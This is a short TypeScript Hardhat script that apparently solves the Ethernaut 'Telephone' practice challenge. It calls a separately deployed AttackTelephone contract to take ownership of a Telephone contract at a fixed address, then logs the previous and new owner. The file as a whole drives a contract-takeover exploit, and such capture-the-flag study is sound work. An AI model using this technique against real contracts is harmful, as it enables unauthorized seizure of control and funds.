import { deployments, ethers } from "hardhat";
import { Address, Deployment } from "hardhat-deploy/types";
import { AttackTelephone, Telephone } from "../typechain-types";

const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

const main = async () => {
    const [deployer] = await ethers.getSigners();
    const contractAddress: Address = "0xe38777C2b6DC75dD31b507CBa28d427a5D6C3C2d";
    const telephone: Telephone = await ethers.getContractAt("Telephone", contractAddress, deployer);

    const attackDeployment: Deployment = await deployments.get("AttackTelephone");
    const attack: AttackTelephone = await ethers.getContractAt("AttackTelephone", attackDeployment.address);

    console.log(`Previous owner: ${await telephone.owner()} 📞`);
    const tx = await attack.changeOwner();
    let status = (await tx.wait()).status === 1;
    console.log(`Attack telephone operation: ${status ? '✅' : '❌'}`);
    console.log(`New owner: ${await telephone.owner()} 📲`);
}

main().catch(error => {
  console.error('🚫', error);
});
